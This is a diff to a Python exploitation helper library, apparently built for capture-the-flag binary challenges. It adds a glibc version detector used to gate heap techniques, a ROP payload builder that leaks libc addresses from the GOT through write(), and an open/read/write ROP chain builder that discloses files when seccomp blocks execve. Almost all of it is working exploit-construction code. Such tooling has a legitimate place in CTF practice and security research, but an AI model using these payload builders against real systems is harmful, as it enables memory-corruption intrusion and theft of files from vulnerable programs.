@@ -270,6 +270,22 @@ def _sections(data: bytes) -> dict:
         return {}
 
 
+def libc_version(data: bytes):
+    """(major, minor) of a glibc image, from the highest `GLIBC_2.NN` symbol-version string it
+    carries. Every glibc exports versioned symbols up to its OWN release, so the max GLIBC_2.NN in
+    the image is its version -- robust, needs no banner string, works on a stripped libc. Returns
+    None when no such version string is present (not a glibc). Used to gate heap techniques
+    correctly (hooks removed in 2.34, safe-linking in 2.32, tcache double-free key in 2.29, House of
+    Force only <2.29) instead of assuming a fixed version."""
+    import re as _re
+    best = None
+    for m in _re.finditer(rb"GLIBC_2\.(\d{1,3})\b", data):
+        n = int(m.group(1))
+        if best is None or n > best:
+            best = n
+    return (2, best) if best is not None else None
+
+
 def libc_symbols(data: bytes, names) -> dict:
     """{name: st_value} for the requested EXPORTED symbols of a libc/.so, read straight from
     .dynsym. `st_value` is the unrelocated vaddr, so the runtime address is `libc_base + st_value`.
@@ -719,6 +735,24 @@ def build_leak_puts(offset: int, *, pop_rdi: int, got: int, puts_plt: int, ret_t
     return bytes(body)
 
 
+def build_leak_write(offset: int, *, pop_rdi: int, pop_rsi: int, pop_rdx: int, got: int,
+                     write_plt: int, ret_to: int, length: int = 0, ret_gadget=None) -> bytes:
+    """Stage 1 via write(1, GOT, 8): emits EXACTLY 8 raw bytes of the libc address at `got` -- no
+    format interpretation and no NUL/newline truncation, so it is robust where the target exposes
+    write() but not puts() (printf-as-string leaks are fragile: a 0x0a or 0x25 byte in the address
+    truncates or mis-parses them). Needs clean pop rsi / pop rdx gadgets; returns to `ret_to`."""
+    body = bytearray(_cyclic(offset))
+    chain = [pop_rdi, 1, pop_rsi, got, pop_rdx, 8, write_plt]
+    if ret_gadget:
+        chain.append(ret_gadget)
+    chain.append(ret_to)
+    for word in chain:
+        body += struct.pack("<Q", word & 0xFFFFFFFFFFFFFFFF)
+    if len(body) < length:
+        body += b"C" * (length - len(body))
+    return bytes(body)
+
+
 def _cyclic(n):
     from .primitive import cyclic
     return cyclic(n)
@@ -812,6 +846,31 @@ def sigreturn_frame(*, rip, rsp=0, rdi=0, rsi=0, rdx=0, rax=0, rbp=0, rbx=0, rcx
         words[w] = vals[reg]
     words[_CSGSFS_WORD] = 0x33
     return b"".join(struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF) for v in words)
+
+
+def build_orw_rop(offset: int, *, pop_rdi: int, pop_rsi: int, pop_rdx: int, open_fn: int,
+                  read_fn: int, write_fn: int, scratch: int, path_len: int = 24,
+                  read_len: int = 256, ret_gadget=None) -> bytes:
+    """open/read/write ROP: read the flag PATH from stdin into `scratch`, open() it, read the file
+    into `scratch`, write() it to stdout. The go-to finisher when seccomp blocks execve -- it
+    discloses a file instead of spawning a shell. Assumes the opened fd is 3 (a fresh process holds
+    0/1/2 open), the standard ORW convention. `open_fn/read_fn/write_fn` and the pop gadgets + scratch
+    are RUNTIME addresses (libc fns relocated by the leaked base). A `ret_gadget` is interleaved
+    before each call to keep rsp 16-aligned for libc's movaps."""
+    q = lambda v: struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)      # noqa: E731
+    pad = q(ret_gadget) if ret_gadget else b""
+
+    def call(fn, *args):
+        regs = (pop_rdi, pop_rsi, pop_rdx)
+        c = b"".join(q(g) + q(a) for g, a in zip(regs, args))
+        return c + pad + q(fn)
+
+    body = bytearray(_cyclic(offset))
+    body += call(read_fn, 0, scratch, path_len)      # read(0, scratch, path_len) <- path sent next
+    body += call(open_fn, scratch, 0)                # open(scratch, O_RDONLY) -> fd 3
+    body += call(read_fn, 3, scratch, read_len)      # read(3, scratch, read_len)
+    body += call(write_fn, 1, scratch, read_len)     # write(1, scratch, read_len)
+    return bytes(body)
 
 
 def execve_feasible(data: bytes):
